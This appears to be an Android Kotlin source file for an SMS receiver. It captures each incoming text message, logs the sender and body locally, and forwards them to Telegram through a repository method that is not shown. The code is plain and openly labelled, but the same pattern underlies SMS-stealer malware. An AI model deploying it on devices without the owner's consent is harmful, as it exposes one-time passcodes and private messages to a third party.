package com.example.receiver

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.util.Log
import com.example.data.AppDatabase
import com.example.data.SmsLogRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            if (messages.isNullOrEmpty()) return

            // Group by sender for multipart SMS texts
            val sender = messages[0].displayOriginatingAddress ?: "Unknown"
            val bodyBuilder = StringBuilder()
            for (msg in messages) {
                bodyBuilder.append(msg.displayMessageBody)
            }
            val body = bodyBuilder.toString()

            val pendingResult = goAsync()
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    val db = AppDatabase.getDatabase(context)
                    val repository = SmsLogRepository(db.smsLogDao(), context)
                    
                    // Save log as PENDING first
                    val insertedId = repository.insert(sender, body, "PENDING")
                    
                    // Forward SMS details to Telegram
                    repository.forwardSmsToTelegram(insertedId, sender, body)
                } catch (e: Exception) {
                    Log.e("SmsReceiver", "Failed to process incoming SMS background broadcast", e)
                } finally {
                    pendingResult.finish()
                }
            }
        }
    }
}
